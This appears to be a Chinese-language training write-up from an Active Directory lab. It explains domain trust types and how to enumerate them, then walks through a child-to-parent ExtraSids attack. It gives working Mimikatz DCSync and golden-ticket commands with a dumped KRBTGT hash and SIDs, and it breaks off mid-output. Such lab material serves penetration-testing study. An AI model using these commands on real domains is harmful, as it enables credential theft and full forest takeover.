<h1 id="Domain-Trusts"><a href="#Domain-Trusts" class="headerlink" title="Domain Trusts"></a>Domain Trusts</h1><p>信任用于建立林间或域间（域内）身份验证，允许用户访问其帐户所在主域之外的另一个域中的资源（或执行管理任务）。<a target="_blank" rel="noopener" href="https://social.technet.microsoft.com/wiki/contents/articles/50969.active-directory-forest-trust-attention-points.aspx">信任</a>在两个域的身份验证系统之间建立链接，并可能允许单向或双向（双向）通信。组织可以创建各种类型的信任：</p>
<ul>
<li><code>Parent-child</code>：同一林内的两个或多个域。子域与父域具有双向传递信任，这意味着子域<code>corp.inlanefreight.local</code>中的用户可以在父域<code>inlanefreight.local</code>中进行身份验证，反之亦然。</li>
<li><code>Cross-link</code>：子域之间的信任，以加快身份验证速度。</li>
<li><code>External</code>：两个独立域之间的非传递信任，这两个域位于不同的林中，且尚未加入林信任。这种信任类型利用<a target="_blank" rel="noopener" href="https://www.serverbrain.org/active-directory-2008/sid-history-and-sid-filtering.html">SID 筛选</a>或筛选出非受信任域的身份验证请求（按 SID）。</li>
<li><code>Tree-root</code>：林根域和新树根域之间的双向可传递信任。它们是在您在林中设置新树根域时设计创建的。</li>
<li><code>Forest</code>：两个林根域之间的可传递信任。</li>
<li><a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/security/compass/esae-retirement">ESAE</a>：用于管理Active Directory的堡垒林。</li>
</ul>
<p>信任可以是可传递的，也可以是非传递的。</p>
<ul>
<li>信任<code>transitive</code>意味着信任扩展到子域信任的对象。例如，假设有三个域。在传递关系中，如果<code>Domain A</code>与 有信任<code>Domain B</code>，并且与<code>Domain B</code>有<code>transitive</code>信任<code>Domain C</code>，那么<code>Domain A</code>将自动信任<code>Domain C</code>。</li>
<li>在 中<code>non-transitive trust</code>，子域本身是唯一受信任的域。</li>
</ul>
<p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2024/image-1729248530489.png" alt="图像"></p>
<p><strong>Trust Table</strong></p>
<table>
<thead>
<tr>
<th>Transitive</th>
<th>Non-Transitive</th>
</tr>
</thead>
<tbody><tr>
<td>共享，一对多</td>
<td>直接信任</td>
</tr>
<tr>
<td>森林里的每个人都有这份信任</td>
<td>不扩展到下一级子域</td>
</tr>
<tr>
<td>森林、树根、父子和交叉链接信任都是可传递的</td>
<td>适用于外部或自定义信任设置</td>
</tr>
</tbody></table>
<p>信任可以从两个方向建立：单向或双向。</p>
<ul>
<li><code>One-way trust</code>：域中的<code>trusted</code>用户可以访问信任域中的资源，反之则不行。</li>
<li><code>Bidirectional trust</code>：两个信任域中的用户都可以访问对方域中的资源。例如，在<code>INLANEFREIGHT.LOCAL</code>和<code>FREIGHTLOGISTICS.LOCAL</code>之间的双向信任中，<code>INLANEFREIGHT.LOCAL</code>中的用户将能够访问<code>FREIGHTLOGISTICS.LOCAL</code>中的资源，反之亦然。</li>
</ul>
<p>域信任通常设置不正确，可能会为提供关键的意外攻击路径。以下是各种信任类型的图形表示。</p>
<p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2024/image-1729248719965.png" alt="图像"></p>
<h2 id="Enum-Trust-Relationships"><a href="#Enum-Trust-Relationships" class="headerlink" title="Enum Trust Relationships"></a>Enum Trust Relationships</h2><h3 id="Powershell"><a href="#Powershell" class="headerlink" title="Powershell"></a>Powershell</h3><h4 id="Get-ADTrust-1"><a href="#Get-ADTrust-1" class="headerlink" title="Get-ADTrust"></a>Get-ADTrust</h4><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="built_in">Import-Module</span> activedirectory</span><br><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="built_in">Get-ADTrust</span> <span class="literal">-Filter</span> *</span><br><span class="line"></span><br><span class="line">Direction               : BiDirectional</span><br><span class="line">DisallowTransivity      : False</span><br><span class="line">DistinguishedName       : CN=LOGISTICS.INLANEFREIGHT.LOCAL,CN=System,DC=INLANEFREIGHT,DC=LOCAL</span><br><span class="line">ForestTransitive        : False</span><br><span class="line">IntraForest             : True</span><br><span class="line">IsTreeParent            : False</span><br><span class="line">IsTreeRoot              : False</span><br><span class="line">Name                    : LOGISTICS.INLANEFREIGHT.LOCAL</span><br><span class="line">ObjectClass             : trustedDomain</span><br><span class="line">ObjectGUID              : f48a1169<span class="literal">-2e58-42c1-ba32-a6ccb10057ec</span></span><br><span class="line">SelectiveAuthentication : False</span><br><span class="line">SIDFilteringForestAware : False</span><br><span class="line">SIDFilteringQuarantined : False</span><br><span class="line">Source                  : DC=INLANEFREIGHT,DC=LOCAL</span><br><span class="line">Target                  : LOGISTICS.INLANEFREIGHT.LOCAL</span><br><span class="line">TGTDelegation           : False</span><br><span class="line">TrustAttributes         : <span class="number">32</span></span><br><span class="line">TrustedPolicy           :</span><br><span class="line">TrustingPolicy          :</span><br><span class="line">TrustType               : Uplevel</span><br><span class="line">UplevelOnly             : False</span><br><span class="line">UsesAESKeys             : False</span><br><span class="line">UsesRC4Encryption       : False</span><br><span class="line"></span><br><span class="line">Direction               : BiDirectional</span><br><span class="line">DisallowTransivity      : False</span><br><span class="line">DistinguishedName       : CN=FREIGHTLOGISTICS.LOCAL,CN=System,DC=INLANEFREIGHT,DC=LOCAL</span><br><span class="line">ForestTransitive        : True</span><br><span class="line">IntraForest             : False</span><br><span class="line">IsTreeParent            : False</span><br><span class="line">IsTreeRoot              : False</span><br><span class="line">Name                    : FREIGHTLOGISTICS.LOCAL</span><br><span class="line">ObjectClass             : trustedDomain</span><br><span class="line">ObjectGUID              : <span class="number">1597717</span>f<span class="literal">-89b7-49b8-9cd9-0801d52475ca</span></span><br><span class="line">SelectiveAuthentication : False</span><br><span class="line">SIDFilteringForestAware : False</span><br><span class="line">SIDFilteringQuarantined : False</span><br><span class="line">Source                  : DC=INLANEFREIGHT,DC=LOCAL</span><br><span class="line">Target                  : FREIGHTLOGISTICS.LOCAL</span><br><span class="line">TGTDelegation           : False</span><br><span class="line">TrustAttributes         : <span class="number">8</span></span><br><span class="line">TrustedPolicy           :</span><br><span class="line">TrustingPolicy          :</span><br><span class="line">TrustType               : Uplevel</span><br><span class="line">UplevelOnly             : False</span><br><span class="line">UsesAESKeys             : False</span><br><span class="line">UsesRC4Encryption       : False</span><br></pre></td></tr></table></figure>

<p>上面的输出显示当前的域<code>INLANEFREIGHT.LOCAL</code>有两个域信任。第一个信任是与<code>LOGISTICS.INLANEFREIGHT.LOCAL</code>，属性<code>IntraForest</code>显示这是一个子域，当前位于林的根域中。第二个信任是与 域的信任<code>FREIGHTLOGISTICS.LOCAL,</code>，<code>ForestTransitive</code>属性设置为<code>True</code>，这意味着这是一个林信任或外部信任。可以看到这两个信任都设置为双向的，这意味着用户可以在两个信任之间来回进行身份验证。在评估期间记下这一点很重要。如果无法跨信任进行身份验证，就无法跨信任执行任何枚举或攻击。</p>
<h4 id="Get-DomainUser-1"><a href="#Get-DomainUser-1" class="headerlink" title="Get-DomainUser"></a>Get-DomainUser</h4><p>枚举 Active Directory 域中的用户信息</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="built_in">Get-DomainUser</span> <span class="literal">-Domain</span> LOGISTICS.INLANEFREIGHT.LOCAL | <span class="built_in">select</span> SamAccountName</span><br><span class="line"></span><br><span class="line">samaccountname</span><br><span class="line"><span class="literal">--------------</span></span><br><span class="line">htb<span class="literal">-student_adm</span></span><br><span class="line">Administrator</span><br><span class="line">Guest</span><br><span class="line">lab_adm</span><br><span class="line">krbtgt</span><br></pre></td></tr></table></figure>

<h3 id="PowerView-4"><a href="#PowerView-4" class="headerlink" title="PowerView"></a>PowerView</h3><h4 id="Get-DomainTrust"><a href="#Get-DomainTrust" class="headerlink" title="Get-DomainTrust"></a>Get-DomainTrust</h4><p>还可以使用 PowerView 和 BloodHound 来枚举信任关系、建立的信任类型和身份验证流程。导入 PowerView 后，可以使用<a target="_blank" rel="noopener" href="https://powersploit.readthedocs.io/en/latest/Recon/Get-DomainTrust/">Get-DomainTrust</a>函数来枚举存在的信任（如果有）。</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="built_in">Get-DomainTrust</span></span><br><span class="line"></span><br><span class="line">SourceName      : INLANEFREIGHT.LOCAL</span><br><span class="line">TargetName      : LOGISTICS.INLANEFREIGHT.LOCAL</span><br><span class="line">TrustType       : WINDOWS_ACTIVE_DIRECTORY</span><br><span class="line">TrustAttributes : WITHIN_FOREST</span><br><span class="line">TrustDirection  : Bidirectional</span><br><span class="line">WhenCreated     : <span class="number">11</span>/<span class="number">1</span>/<span class="number">2021</span> <span class="number">6</span>:<span class="number">20</span>:<span class="number">22</span> PM</span><br><span class="line">WhenChanged     : <span class="number">2</span>/<span class="number">26</span>/<span class="number">2022</span> <span class="number">11</span>:<span class="number">55</span>:<span class="number">55</span> PM</span><br><span class="line"></span><br><span class="line">SourceName      : INLANEFREIGHT.LOCAL</span><br><span class="line">TargetName      : FREIGHTLOGISTICS.LOCAL</span><br><span class="line">TrustType       : WINDOWS_ACTIVE_DIRECTORY</span><br><span class="line">TrustAttributes : FOREST_TRANSITIVE</span><br><span class="line">TrustDirection  : Bidirectional</span><br><span class="line">WhenCreated     : <span class="number">11</span>/<span class="number">1</span>/<span class="number">2021</span> <span class="number">8</span>:<span class="number">07</span>:<span class="number">09</span> PM</span><br><span class="line">WhenChanged     : <span class="number">2</span>/<span class="number">27</span>/<span class="number">2022</span> <span class="number">12</span>:<span class="number">02</span>:<span class="number">39</span> AM</span><br></pre></td></tr></table></figure>

<p>PowerView 可用于执行域信任映射并提供诸如信任类型（父&#x2F;子、外部、林）和信任方向（单向或双向）等信息。一旦获得立足点，这些信息就会很有用，计划进一步破坏环境。</p>
<h4 id="Get-DomainTrustMapping-1"><a href="#Get-DomainTrustMapping-1" class="headerlink" title="Get-DomainTrustMapping"></a>Get-DomainTrustMapping</h4><p>枚举 Active Directory 环境中域与域之间的信任关系</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="built_in">Get-DomainTrustMapping</span></span><br><span class="line"></span><br><span class="line">SourceName      : INLANEFREIGHT.LOCAL</span><br><span class="line">TargetName      : LOGISTICS.INLANEFREIGHT.LOCAL</span><br><span class="line">TrustType       : WINDOWS_ACTIVE_DIRECTORY</span><br><span class="line">TrustAttributes : WITHIN_FOREST</span><br><span class="line">TrustDirection  : Bidirectional</span><br><span class="line">WhenCreated     : <span class="number">11</span>/<span class="number">1</span>/<span class="number">2021</span> <span class="number">6</span>:<span class="number">20</span>:<span class="number">22</span> PM</span><br><span class="line">WhenChanged     : <span class="number">2</span>/<span class="number">26</span>/<span class="number">2022</span> <span class="number">11</span>:<span class="number">55</span>:<span class="number">55</span> PM</span><br><span class="line"></span><br><span class="line">SourceName      : INLANEFREIGHT.LOCAL</span><br><span class="line">TargetName      : FREIGHTLOGISTICS.LOCAL</span><br><span class="line">TrustType       : WINDOWS_ACTIVE_DIRECTORY</span><br><span class="line">TrustAttributes : FOREST_TRANSITIVE</span><br><span class="line">TrustDirection  : Bidirectional</span><br><span class="line">WhenCreated     : <span class="number">11</span>/<span class="number">1</span>/<span class="number">2021</span> <span class="number">8</span>:<span class="number">07</span>:<span class="number">09</span> PM</span><br><span class="line">WhenChanged     : <span class="number">2</span>/<span class="number">27</span>/<span class="number">2022</span> <span class="number">12</span>:<span class="number">02</span>:<span class="number">39</span> AM</span><br><span class="line"></span><br><span class="line">SourceName      : FREIGHTLOGISTICS.LOCAL</span><br><span class="line">TargetName      : INLANEFREIGHT.LOCAL</span><br><span class="line">TrustType       : WINDOWS_ACTIVE_DIRECTORY</span><br><span class="line">TrustAttributes : FOREST_TRANSITIVE</span><br><span class="line">TrustDirection  : Bidirectional</span><br><span class="line">WhenCreated     : <span class="number">11</span>/<span class="number">1</span>/<span class="number">2021</span> <span class="number">8</span>:<span class="number">07</span>:<span class="number">08</span> PM</span><br><span class="line">WhenChanged     : <span class="number">2</span>/<span class="number">27</span>/<span class="number">2022</span> <span class="number">12</span>:<span class="number">02</span>:<span class="number">41</span> AM</span><br><span class="line"></span><br><span class="line">SourceName      : LOGISTICS.INLANEFREIGHT.LOCAL</span><br><span class="line">TargetName      : INLANEFREIGHT.LOCAL</span><br><span class="line">TrustType       : WINDOWS_ACTIVE_DIRECTORY</span><br><span class="line">TrustAttributes : WITHIN_FOREST</span><br><span class="line">TrustDirection  : Bidirectional</span><br><span class="line">WhenCreated     : <span class="number">11</span>/<span class="number">1</span>/<span class="number">2021</span> <span class="number">6</span>:<span class="number">20</span>:<span class="number">22</span> PM</span><br><span class="line">WhenChanged     : <span class="number">2</span>/<span class="number">26</span>/<span class="number">2022</span> <span class="number">11</span>:<span class="number">55</span>:<span class="number">55</span> PM</span><br></pre></td></tr></table></figure>

<h3 id="netdom-query"><a href="#netdom-query" class="headerlink" title="netdom query"></a>netdom query</h3><h4 id="Domain-Trust"><a href="#Domain-Trust" class="headerlink" title="Domain Trust"></a>Domain Trust</h4><p>可以用来获取域信任的另一个工具是<code>netdom</code>。Windows中的命令行工具<code>netdom query</code>的子命令<code>netdom</code>可以检索有关域的信息，包括工作站、服务器和域信任的列表。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">C:\&gt; netdom query /domain:inlanefreight.local trust</span><br><span class="line">Direction Trusted\Trusting domain                         Trust type</span><br><span class="line">========= =======================                         ==========</span><br><span class="line"></span><br><span class="line">&lt;-&gt;       LOGISTICS.INLANEFREIGHT.LOCAL</span><br><span class="line">Direct</span><br><span class="line"> Not found</span><br><span class="line"></span><br><span class="line">&lt;-&gt;       FREIGHTLOGISTICS.LOCAL</span><br><span class="line">Direct</span><br><span class="line"> Not found</span><br><span class="line"></span><br><span class="line">The command completed successfully.</span><br></pre></td></tr></table></figure>

<h4 id="Domain-Controllers"><a href="#Domain-Controllers" class="headerlink" title="Domain Controllers"></a>Domain Controllers</h4><p>查询域控制器</p>
<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">C:\&gt; <span class="title">netdom</span> <span class="title">query</span> /<span class="title">domain:inlanefreight</span>.<span class="title">local</span> <span class="title">dc</span></span></span><br><span class="line"><span class="function"><span class="title">List</span> <span class="title">of</span> <span class="title">domain</span> <span class="title">controllers</span> <span class="title">with</span> <span class="title">accounts</span> <span class="title">in</span> <span class="title">the</span> <span class="title">domain</span>:</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">ACADEMY</span>-<span class="title">EA</span>-<span class="title">DC01</span></span></span><br><span class="line"><span class="function"><span class="title">The</span> <span class="title">command</span> <span class="title">completed</span> <span class="title">successfully</span>.</span></span><br></pre></td></tr></table></figure>

<h4 id="Workstations-and-Servers"><a href="#Workstations-and-Servers" class="headerlink" title="Workstations and Servers"></a>Workstations and Servers</h4><p>查询工作站和服务器</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">C:\&gt; netdom query /domain:inlanefreight.local workstation</span><br><span class="line">List of workstations with accounts in the domain:</span><br><span class="line"></span><br><span class="line">ACADEMY-EA-MS01</span><br><span class="line">ACADEMY-EA-MX01      ( Workstation or Server )</span><br><span class="line"></span><br><span class="line">SQL01      ( Workstation or Server )</span><br><span class="line">ILF-XRG      ( Workstation or Server )</span><br><span class="line">MAINLON      ( Workstation or Server )</span><br><span class="line">CISERVER      ( Workstation or Server )</span><br><span class="line">INDEX-DEV-LON      ( Workstation or Server )</span><br><span class="line">...SNIP...</span><br></pre></td></tr></table></figure>

<p>还可以使用 BloodHound 通过<code>Map Domain Trusts</code>预先构建的查询来可视化这些信任关系。在这里可以轻松地看到存在两个双向信任。</p>
<h3 id="BloodHound-3"><a href="#BloodHound-3" class="headerlink" title="BloodHound"></a>BloodHound</h3><p>可视化信任关系</p>
<p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2024/image-1729251082202.png" alt="图像"></p>
<hr>
<h1 id="Attacking-Domain-Trusts-Child-Parent-Trusts"><a href="#Attacking-Domain-Trusts-Child-Parent-Trusts" class="headerlink" title="Attacking Domain Trusts - Child -&gt; Parent Trusts"></a>Attacking Domain Trusts - Child -&gt; Parent Trusts</h1><h2 id="SID-History"><a href="#SID-History" class="headerlink" title="SID History"></a>SID History</h2><p><a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/windows/win32/adschema/a-sidhistory">SID History</a>属性用于迁移场景，如果一个域中的用户迁移到另一个域，则会在第二个域中创建一个新账户，原用户的 SID 会添加到新用户的 SID 历史属性中，确保用户仍可访问原域中的资源。</p>
<p>SID 历史记录旨在跨域工作，但可以在同一个域中工作。使用 Mimikatz，攻击者可以执行 SID 历史记录注入，并将管理员帐户添加到他们控制的帐户的 SID 历史记录属性中。使用此帐户登录时，与该帐户关联的所有 SID 都会添加到用户的令牌中。</p>
<p>此令牌用于确定帐户可以访问哪些资源。如果将域管理员帐户的 SID 添加到此帐户的 SID 历史记录属性中，则此帐户将能够执行 DCSync 并创建<a target="_blank" rel="noopener" href="https://attack.mitre.org/techniques/T1558/001/">黄金票证</a>或 Kerberos 票证授予票证 (TGT)，这将允许以所选域中的任何帐户的身份进行身份验证，以实现进一步的持久性。</p>
<h2 id="ExtraSids-Attack-Windows"><a href="#ExtraSids-Attack-Windows" class="headerlink" title="ExtraSids Attack - Windows"></a>ExtraSids Attack - Windows</h2><p>一旦子域被攻陷，此攻击便可攻陷父域。在同一个 AD 林中，由于缺乏<a target="_blank" rel="noopener" href="https://www.serverbrain.org/active-directory-2008/sid-history-and-sid-filtering.html">SID 筛选保护， </a><a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/windows/win32/adschema/a-sidhistory">SID History</a>属性受到尊重。SID 筛选是一种保护措施，用于过滤来自跨信任的另一个林中的域的身份验证请求。因此，如果子域中的用户将其 SID History 设置为（仅存在于父域中），则他们被视为此组的成员，从而允许对整个林进行管理访问。换句话说，正在从被攻陷的子域创建黄金票证以攻陷父域。在这种情况下，利用<code>SIDHistory</code>授予帐户（或不存在的帐户）企业管理员权限，方法是修改<code>Enterprise Admins group</code>此属性以包含企业管理员组的 SID，这将使无需实际成为该组的一部分即可完全访问父域。</p>
<p>为了在入侵子域后执行此攻击，需要以下内容：</p>
<ul>
<li><p>子域的 KRBTGT 哈希</p>
</li>
<li><p>子域的 SID</p>
</li>
<li><p>子域中的目标用户的名称（不需要存在！）</p>
</li>
<li><p>子域的 FQDN。</p>
</li>
<li><p>根域的企业管理员组的 SID</p>
</li>
</ul>
<p>收集到这些数据后，就可以使用 Mimikatz 进行攻击。</p>
<p><a target="_blank" rel="noopener" href="https://adsecurity.org/?p=483">KRBTGT</a>帐户是 Active Directory 中密钥分发中心 (KDC) 的服务帐户。帐户 KRB（Kerberos）TGT（Ticket Granting Ticket）用于加密&#x2F;签署给定域内授予的所有 Kerberos 票证。域控制器使用该帐户的密码来解密和验证 Kerberos 票证。KRBTGT 帐户可用于创建 Kerberos TGT 票证，该票证可用于请求域中任何主机上任何服务的 TGS 票证，这也称为<code>Golden Ticket attack</code>，是 Active Directory 环境中攻击者众所周知的持久性机制。使黄金票证失效的唯一方法是更改 KRBTGT 帐户的密码，这应该定期进行，并且在渗透测试评估达到整个域入侵后一定要进行。</p>
<h3 id="Collect"><a href="#Collect" class="headerlink" title="Collect"></a>Collect</h3><h4 id="Mimikatz-2"><a href="#Mimikatz-2" class="headerlink" title="Mimikatz"></a>Mimikatz</h4><p>由于已经破坏了子域，可以以域管理员或类似身份登录并执行 DCSync 攻击以获取 KRBTGT 帐户的 NT Hash。</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt;  mimikatz <span class="comment"># lsadump::dcsync /user:LOGISTICS\krbtgt</span></span><br><span class="line">[<span class="type">DC</span>] <span class="string">&#x27;LOGISTICS.INLANEFREIGHT.LOCAL&#x27;</span> will be the domain</span><br><span class="line">[<span class="type">DC</span>] <span class="string">&#x27;ACADEMY-EA-DC02.LOGISTICS.INLANEFREIGHT.LOCAL&#x27;</span> will be the DC server</span><br><span class="line">[<span class="type">DC</span>] <span class="string">&#x27;LOGISTICS\krbtgt&#x27;</span> will be the user account</span><br><span class="line">[<span class="type">rpc</span>] Service  : ldap</span><br><span class="line">[<span class="type">rpc</span>] AuthnSvc : GSS_NEGOTIATE (<span class="number">9</span>)</span><br><span class="line"></span><br><span class="line">Object RDN           : krbtgt</span><br><span class="line"></span><br><span class="line">** SAM ACCOUNT **</span><br><span class="line"></span><br><span class="line">SAM Username         : krbtgt</span><br><span class="line">Account <span class="built_in">Type</span>         : <span class="number">30000000</span> ( USER_OBJECT )</span><br><span class="line">User Account Control : <span class="number">00000202</span> ( ACCOUNTDISABLE NORMAL_ACCOUNT )</span><br><span class="line">Account expiration   :</span><br><span class="line">Password last change : <span class="number">11</span>/<span class="number">1</span>/<span class="number">2021</span> <span class="number">11</span>:<span class="number">21</span>:<span class="number">33</span> AM</span><br><span class="line">Object Security ID   : S<span class="literal">-1-5-21-2806153819-209893948-922872689-502</span></span><br><span class="line">Object Relative ID   : <span class="number">502</span></span><br><span class="line"></span><br><span class="line">Credentials:</span><br><span class="line">  Hash NTLM: <span class="number">9</span>d765b482771505cbe97411065964d5f</span><br><span class="line">    ntlm- <span class="number">0</span>: <span class="number">9</span>d765b482771505cbe97411065964d5f</span><br><span class="line">    lm  - <span class="number">0</span>: <span class="number">69</span>df324191d4a80f0ed100c10f20561e</span><br></pre></td></tr></table></figure>

<h4 id="PowerView-5"><a href="#PowerView-5" class="headerlink" title="PowerView"></a>PowerView</h4><p>PowerView Get-DomainSID 函数来获取子域的 SID</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="built_in">Get-DomainSID</span></span><br><span class="line"></span><br><span class="line">S<span class="literal">-1-5-21-2806153819-209893948-922872689</span></span><br></pre></td></tr></table></figure>

<p>获取父域中 Enterprise Admins 组的 SID</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="built_in">Get-DomainGroup</span> <span class="literal">-Domain</span> INLANEFREIGHT.LOCAL <span class="literal">-Identity</span> <span class="string">&quot;Enterprise Admins&quot;</span> | <span class="built_in">select</span> distinguishedname,objectsid</span><br><span class="line"></span><br><span class="line">distinguishedname                                       objectsid                                    </span><br><span class="line"><span class="literal">-----------------</span>                                       <span class="literal">---------</span>                                    </span><br><span class="line">CN=Enterprise Admins,CN=Users,DC=INLANEFREIGHT,DC=LOCAL S<span class="literal">-1-5-21-3842939050-3880317879-2865463114-519</span></span><br></pre></td></tr></table></figure>

<p>也可以使用<a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/powershell/module/activedirectory/get-adgroup?view=windowsserver2022-ps">Get-ADGroup</a> cmdlet 执行此操作，命令如下</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="built_in">Get-ADGroup</span> <span class="literal">-Identity</span> <span class="string">&quot;Enterprise Admins&quot;</span> <span class="literal">-Server</span> <span class="string">&quot;INLANEFREIGHT.LOCAL&quot;</span></span><br></pre></td></tr></table></figure>

<h3 id="Golden-Ticket"><a href="#Golden-Ticket" class="headerlink" title="Golden Ticket"></a>Golden Ticket</h3><p>至此，收集了以下数据点：</p>
<ul>
<li>子域的 KRBTGT 哈希：<code>9d765b482771505cbe97411065964d5f</code></li>
<li>子域的 SID：<code>S-1-5-21-2806153819-209893948-922872689</code></li>
<li>子域中的目标用户的名称（创建黄金票证时不需要存在！）：选择一个虚假用户：<code>hacker</code></li>
<li>子域的 FQDN：<code>LOGISTICS.INLANEFREIGHT.LOCAL</code></li>
<li>根域的企业管理员组的 SID:<code>S-1-5-21-3842939050-3880317879-2865463114-519</code></li>
</ul>
<h4 id="Mimikatz-3"><a href="#Mimikatz-3" class="headerlink" title="Mimikatz"></a>Mimikatz</h4><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; mimikatz.exe</span><br><span class="line"></span><br><span class="line">mimikatz <span class="comment"># kerberos::golden /user:hacker /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:S-1-5-21-2806153819-209893948-922872689 /krbtgt:9d765b482771505cbe97411065964d5f /sids:S-1-5-21-3842939050-3880317879-2865463114-519 /ptt</span></span><br><span class="line">User      : hacker</span><br><span class="line">Domain    : LOGISTICS.INLANEFREIGHT.LOCAL (LOGISTICS)</span><br><span class="line">SID       : S<span class="literal">-1-5-21-2806153819-209893948-922872689</span></span><br><span class="line">User Id   : <span class="number">500</span></span><br><span class="line">Groups Id : *<span class="number">513</span> <span class="number">512</span> <span class="number">520</span> <span class="number">518</span> <span class="number">519</span></span><br><span class="line">Extra SIDs: S<span class="literal">-1-5-21-3842939050-3880317879-2865463114-519</span> ;</span><br><span class="line">ServiceKey: <span class="number">9</span>d765b482771505cbe97411065964d5f - rc4_hmac_nt</span><br><span class="line">Lifetime  : <span class="number">3</span>/<span class="number">28</span>/<span class="number">2022</span> <span 